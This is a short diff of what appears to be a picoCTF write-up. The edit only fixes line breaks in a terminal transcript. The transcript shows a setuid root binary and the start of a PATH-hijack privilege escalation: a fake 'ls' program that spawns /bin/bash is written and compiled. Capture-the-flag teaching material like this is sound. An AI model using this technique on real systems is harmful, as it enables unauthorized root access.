@@ -45,7 +45,8 @@ It is important to get familiar with the machine we log into so that we can find
 ctf-player@pico-chall$ ls
 bin
 ctf-player@pico-chall$ file bin
-bin: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l d-linux-x86-64.so.2, BuildID[shal]=202cb71538089bb22aa22d5d3f8f77a8a94a826f, for GNU/Linux 3.2.0, not stripp ctf-player@pico-chall$ ls -l
+bin: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l d-linux-x86-64.so.2, BuildID[shal]=202cb71538089bb22aa22d5d3f8f77a8a94a826f, for GNU/Linux 3.2.0, not stripp 
+ctf-player@pico-chall$ ls -l
 ed
 total 20
 -rwsr-xr-x 1 root root 18752 Aug 4 2023 bin
@@ -141,7 +142,8 @@ ctf-player@pico-chall$ echo "#include <stdio.h>" >> ls.c
 ctf-player@pico-chall$ echo "#include <stdlib.h>" >> ls.c
 ctf-player@pico-chall$ echo "int main()" >> ls.c
 ctf-player@pico-chall$ echo "{" >> ls.c
-ctf-player@pico-chall$ echo " system(\"/bin/bash\");" >> ls.c ctf-player@pico-chall$ echo "}" >> ls.c
+ctf-player@pico-chall$ echo " system(\"/bin/bash\");" >> ls.c 
+ctf-player@pico-chall$ echo "}" >> ls.c
 ctf-player@pico-chall$ cc ls.c -o ls
 ```
 
